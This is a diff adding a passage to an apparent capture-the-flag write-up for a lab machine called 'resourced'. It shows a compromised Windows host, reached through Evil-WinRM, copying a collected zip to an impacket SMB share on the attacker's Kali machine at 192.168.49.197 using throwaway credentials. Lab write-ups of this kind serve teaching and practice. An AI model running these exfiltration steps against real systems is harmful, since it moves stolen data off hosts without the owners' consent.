@@ -271,3 +271,29 @@ Mode                LastWriteTime         Length Name
 -a----        8/29/2022  10:46 AM          11880 20220829104653_resourced.zip
 -a----        8/29/2022  10:46 AM           8964 N2NkZDYyMzItY2UxZi00N2ZkLTg4ZmQtNThlNjJlZDQ1NzJh.bin
 ```
+Now we need to move that file to our local machine, I opened an smb server using impacket tools and copied the zip file to the share I created:
+
+**On our attacking machine**:
+```
+┌──(root💀kali)-[~/tryhackme/rooms/Practice/resourced]
+└─# /opt/impacket/build/scripts-3.10/smbserver.py share . -smb2support -username df -password df
+Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+.
+.
+.
+```
+**On the victim machine**:
+```
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> net use \\192.168.49.197\share /u:df df
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> copy 20220829122716_resourced.zip \\192.168.49.197\share
+
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> net use /d \\192.168.49.197\share
+\\192.168.49.197\share was deleted successfully.
+```
